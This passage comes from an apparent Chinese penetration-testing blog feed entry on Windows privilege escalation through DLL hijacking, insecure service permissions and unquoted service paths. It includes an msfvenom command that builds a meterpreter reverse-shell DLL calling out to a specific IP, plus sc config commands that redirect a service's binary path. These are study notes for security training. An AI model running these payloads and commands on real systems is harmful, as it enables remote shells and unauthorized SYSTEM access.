class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、应用程序加载的目录</span><br><span class="line">2、C:\Windows\System32</span><br><span class="line">3、C:\Windows\System</span><br><span class="line">4、C:\Windows</span><br><span class="line">5、当前工作目录 Current Working Directory，CWD</span><br><span class="line">6、在 PATH 环境变量的目录（先系统后用户）</span><br><span class="line"></span><br><span class="line">过程：信息收集（第三方软件）-进程调试（本地调试）-制作 dll 并上传-替换 dll-启动应用后成功</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/e85ea697d44718541afbfbe8c7c3f4b3.png" alt="image.png"></p><p><strong>​</strong></p><p><strong>#案例3.Win2012-不安全的服务权限配合MSF-本地权限</strong><br /><strong>​</strong></p><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有 过多的权限，例如，可以直接修改它导致重定向执行文件。 过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; *#微软官方工具</span><br><span class="line">accesschk.exe -uwcqv &quot;users&quot; *</span><br><span class="line">sc config &quot;NewServiceName&quot; binpath=&quot;C:\Program.exe&quot;</span><br><span class="line">sc start &quot;NewServiceName&quot;</span><br></pre></td></tr></table></figure><p><br /><strong>#案例4.Win2012-不带引号服务路径配合MSF-Web，本地权限</strong><br />原理：当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系 统将会执行找到的空格分隔的服务路径的第一个实例。<br />过程：检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0cb43a58d26e2d56446cfa9e2023d543.png" alt="image.png"><br> /i /v “””</p><pre><code>[外链图片转存中...(img-9Eha8Un1-1634110127895)]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;RottenPotato(烂土豆)提权的原理简述如下：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端&lt;/li&gt;
&lt;li&gt;对这个认证过程使用中间人攻击（NTLM重放），为</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
